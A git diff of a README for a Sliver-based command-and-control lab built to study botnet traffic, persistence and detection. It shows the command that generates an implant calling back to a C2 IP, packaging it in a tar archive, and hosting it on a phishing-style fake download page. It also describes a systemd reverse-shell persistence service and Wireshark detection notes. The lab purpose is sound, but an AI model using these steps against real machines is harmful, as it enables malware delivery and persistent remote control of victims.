@@ -1,6 +1,6 @@
 # C2Lab 
 
-- C2Lab - A lightweight and customizable Command &amp; Control (C2) lab using Sliver for testing and analyzing botnet communications, persistence, and network detection techniques.
+- **C2Lab** - A lightweight and customizable **Command &amp; Control (C2) lab using Sliver** for testing and analyzing **botnet communications, persistence, and network detection techniques.**
 
 ## 🚀 Project Overview
 
@@ -37,6 +37,8 @@
 - Generated an Implant (Malicious Payload), then Created a Listener on Port 443 using mTLS (See [Multiple Domains/Protocols Section](https://sliver.sh/docs?name=Getting+Started), if you want to use Multiple Protocols
   ```sh
   sliver > generate --mTLS [C2 Machine Public IP Address] --os linux --arch amd64 --save [Payload Name]
+  chmod +x [Payload File]
+  tar -cvpf [Payload File].tar /path/to/[Payload File]
   ```
   <img src="assets/Sliver_Generating_Implant.png" width="500" alt="Sliver Generating Implant (Malicious Payload)" />
 
@@ -44,12 +46,13 @@
 
 - Created a phishing-style HTML page to simulate a real website.
 - **Website Purpose:** The fake website mimics a Software Download Center, designed to appear legitimate while serving a malicious payload.
-- The malicious file **(test_file.tar)**, a compressed archive containing the Sliver implant. The attacker packs the file into a .tar archive to maintain file permissions, ensuring that execution privileges remain intact when extracted by the victim.
+- The malicious file **(test_file.tar)**, a compressed archive containing the Sliver implant. The attacker packs the file into a **.tar archive to maintain file permissions**, ensuring that execution privileges remain intact when extracted by the victim.
   
    <img src="assets/Test_File.png" width="500" alt="Our Archived Malicious File" />
 - Hosted it on the C2 server
 - Transferred the HTML file to **/var/www/html/index.html** on the C2 machine.
-- Hosted the website using Apache by placing it in the default web root directory.
+- Transferred the our **Malicious File test_file.tar** also to **/var/www/html/** on the C2 machine.
+- Hosted the website using **Apache** by placing it in the default web root directory.
 - Restarted the Apache service using
   ```sh
   sudo systemctl restart apache2
@@ -76,7 +79,7 @@
   <img src="assets/Sessions.png" width="500" alt="Sessions Sample" />
 
 5️⃣ **Persistence Setup**
-- Created a systemd service (persistence.service) for a persistent reverse shell
+- Created a **systemd service (persistence.service)** for a persistent **reverse shell**
 - Configured it to automatically restart upon failure
 - Service Unit File Made (Port Chosen was 7777):
   ```sh
@@ -123,7 +126,7 @@
   - Bot ⟷ C2: After execution, encrypted communication occurs between the bot and C2, where commands and responses are exchanged. Check **capture_from_C2_to_botnet.pcap**
   - Bot ➝ C2 (Persistence): A reverse shell connection is established to port 7777. Screenshot from **persistence_shell_on_port_7777.pcap**, apply **tcp.port == 7777** to get intended packets more faster.
     <img src="assets/VM0_Establishing_the_Reverse_Shell.png" width="700" alt="VM0 Establishing the Reverse Shell Back to the C2 Machine on Port 7777" />
-- Since all traffic is encrypted, detection techniques were explored
+- **Note:** Since all traffic is encrypted, detection techniques were explored. One key observation is that **Wireshark's "Resolve Network Addresses" option** was disabled by me, meaning IPs are not automatically translated into their associated domain names. However, enabling this option **(View > Name Resolution > Check Resolve Network Addresses)** reveals that our C2 server resolves to **softwaredownloadcenter.westus.cloudapp.azure.com.** This domain name, while appearing legitimate, could still raise suspicion upon closer inspection—especially in an environment where C2 traffic is actively monitored.
 
 ## 🔍 Detection Techniques
 
